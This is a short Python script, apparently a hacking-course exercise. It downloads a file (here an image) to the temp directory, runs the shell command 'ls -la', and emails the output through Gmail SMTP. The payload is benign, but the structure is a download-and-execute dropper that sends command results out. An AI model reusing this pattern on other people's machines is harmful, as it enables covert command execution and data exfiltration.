#!/usr/bin/python3

import requests, os, tempfile, subprocess, smtplib

def download_file_execute_cmd(url, file_name):
    response = requests.get(url)
    temp_file = tempfile.gettempdir()
    os.chdir(temp_file)
    with open(file_name, 'wb') as file:
        file.write(response.content)
    return subprocess.check_output("ls -la", shell=True)

def send_email(email, password, content):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, content)
    server.quit()

email = ""
password = ""
url = "https://assets.goal.com/v3/assets/bltcc7a7ffd2fbf71f5/bltf21c2ee30c00121a/627cbc382b67610d5673246f/GettyImages-1347553871.jpg"
file_name = url.split("/")[-1]
result = download_file_execute_cmd(url, file_name)
os.remove(file_name)
send_email(email, password, result.decode())
print("program execute successfully.")